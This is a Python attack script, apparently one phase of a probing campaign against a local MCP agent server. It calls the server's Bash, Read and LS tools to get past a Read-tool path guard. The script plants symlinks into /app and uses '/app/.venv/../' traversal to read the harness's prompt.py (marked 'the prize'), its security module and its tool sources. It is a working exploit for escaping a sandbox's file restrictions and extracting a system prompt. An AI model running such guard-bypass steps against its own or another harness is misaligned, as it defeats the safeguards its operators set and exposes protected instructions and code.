#!/usr/bin/env python3
"""Phase 11: bypass Read guard via traversal + symlink."""
import requests

URL = "http://127.0.0.1:12600/mcp"
HDRS = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
OUT = "/home/z/my-project/download/phase11.txt"


def unescape_json_string(s, i):
    out = []
    n = len(s)
    while i < n:
        c = s[i]
        if c == '"':
            return "".join(out), i + 1
        if c == "\\":
            if i + 1 >= n:
                break
            e = s[i + 1]
            if e == "n": out.append("\n"); i += 2
            elif e == "t": out.append("\t"); i += 2
            elif e == "r": out.append("\r"); i += 2
            elif e == '"': out.append('"'); i += 2
            elif e == "\\": out.append("\\"); i += 2
            elif e == "/": out.append("/"); i += 2
            elif e == "b": out.append("\b"); i += 2
            elif e == "f": out.append("\f"); i += 2
            elif e == "u":
                cp = int(s[i + 2:i + 6], 16)
                i += 6
                if 0xD800 <= cp <= 0xDBFF and s[i:i + 2] == "\\u":
                    try:
                        lo = int(s[i + 2:i + 6], 16)
                        if 0xDC00 <= lo <= 0xDFFF:
                            cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00)
                            i += 6
                    except ValueError:
                        pass
                out.append(chr(cp))
            else:
                out.append(e); i += 2
        else:
            out.append(c); i += 1
    return "".join(out), i


def extract_texts(raw):
    texts, idx = [], 0
    while True:
        j = raw.find('"text":"', idx)
        if j < 0:
            break
        t, end = unescape_json_string(raw, j + 8)
        texts.append(t)
        idx = end
    return texts


def call(out, tool, args, i):
    out.write("\n" + "=" * 20 + f" {tool} {args} " + "=" * 20 + "\n")
    try:
        p = {"jsonrpc": "2.0", "id": i, "method": "tools/call",
             "params": {"name": tool, "arguments": args}}
        r = requests.post(URL, headers=HDRS, json=p, timeout=300)
        texts = extract_texts(r.text)
        if texts:
            for t in texts:
                out.write(t + "\n")
        else:
            out.write(f"[no text; status={r.status_code} head={r.text[:300]}]\n")
    except Exception as e:
        out.write(f"[exception: {type(e).__name__}: {e}]\n")
    out.flush()


def main():
    with open(OUT, "w", encoding="utf-8") as out:
        out.write("=== Phase 11: Read guard bypass ===\n")
        requests.post(URL, headers=HDRS, json={
            "jsonrpc": "2.0", "id": 0, "method": "initialize",
            "params": {"protocolVersion": "2025-03-26", "capabilities": {},
                       "clientInfo": {"name": "p", "version": "1"}}}, timeout=60)
        requests.post(URL, headers=HDRS, json={
            "jsonrpc": "2.0", "method": "notifications/initialized"}, timeout=60)

        i = 1

        # ---- Vector 0: set up symlinks (as z, inside our own workspace) ----
        call(out, "Bash", {"command":
            "mkdir -p /home/z/my-project/links && "
            "ln -sfn /app/app /home/z/my-project/links/app && "
            "ln -sfn /app /home/z/my-project/links/fullapp && "
            "ls -la /home/z/my-project/links/"}, i); i += 1

        # ---- Vector 1: path traversal through allowed /app/.venv prefix ----
        traversal_targets = [
            "/app/.venv/../app/prompt.py",           # the prize
            "/app/.venv/../app/util/security.py",
            "/app/.venv/../app/util/skill.py",
            "/app/.venv/../app/tool/bash.py",
            "/app/.venv/../app/tool/edit.py",
            "/app/.venv/../uv.lock",
        ]
        for f in traversal_targets:
            call(out, "Read", {"filepath": f}, i); i += 1

        # ---- Vector 2: symlink via workspace ----
        # direct file symlink through dir symlink: links/app/prompt.py
        symlink_targets = [
            "/home/z/my-project/links/app/prompt.py",
            "/home/z/my-project/links/fullapp/app/prompt.py",
            "/home/z/my-project/links/fullapp/uv.lock",
        ]
        for f in symlink_targets:
            call(out, "Read", {"filepath": f}, i); i += 1

        # ---- Vector 3: LS through symlink (rg-based, but the dir now
        #      reachable from a home path - may need --follow, we'll see) ----
        call(out, "LS", {"path": "/home/z/my-project/links/app"}, i); i += 1

    print(f"Done. Report written to {OUT}")


if __name__ == "__main__":
    main()
